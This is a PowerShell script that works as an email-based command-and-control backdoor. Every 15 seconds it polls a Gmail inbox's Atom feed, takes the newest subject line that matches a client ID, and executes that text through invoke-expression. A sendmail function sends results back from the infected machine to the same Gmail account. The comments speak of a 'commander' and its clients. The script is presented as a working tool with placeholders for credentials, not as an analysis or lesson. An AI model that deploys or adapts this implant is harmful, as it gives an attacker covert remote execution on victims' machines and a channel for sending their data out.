cls
$username = "emailaddress@gmail.com" 
$password = "password goes here" 
$client_name = "random number for each client ex: 123455"

Function sendmail($message){
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$to = $username
$from = $username
#If you want to create an email filter and remove emails that come into the inbox that start with "Email From client" you can use the following to include the $client_name.
#Emails with $client_name in the subject line break the script if they arent the syntax that the commander sends. So by default this options is set to not send $client_name in subject.

#$subject = "Email from Client " + $client_name
$subject = "Email from Client"

$body = $message



$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password);
$smtp.send($from, $to, $subject, $body)
}


$check = $null

While($true){

start-sleep -s 15

$url = "https://mail.google.com/mail/feed/atom"
$webclient = new-object System.Net.WebClient
$username_01 = $username.split('@')[0]
$webclient.Credentials = new-object System.Net.NetworkCredential($username_01, $password)
$xml = $webclient.DownloadString($url)
$xml = [xml]$xml
$inbox = $xml.feed.entry

$inbox.Title


$object_01 = New-object psobject -property @{
Title = $msg.title
Time = $msg.issued
}

$array = @()

foreach ($msg in $inbox){
$object_001 = $object_01|select-object *
$issued = $msg.issued
$title = $msg.title

$object_001.Time = $issued
$object_001.Title = $title
$array += $object_001

}

$finder = $array|where-object {$_.Title -match $client_name}|sort-object -property Time |select-object -last 1

if($check) {if ([datetime]$finder.Time -eq [datetime]$check){continue}}

$command = $finder.title.split('~')[0]

invoke-expression $command
$check = $finder.Time


}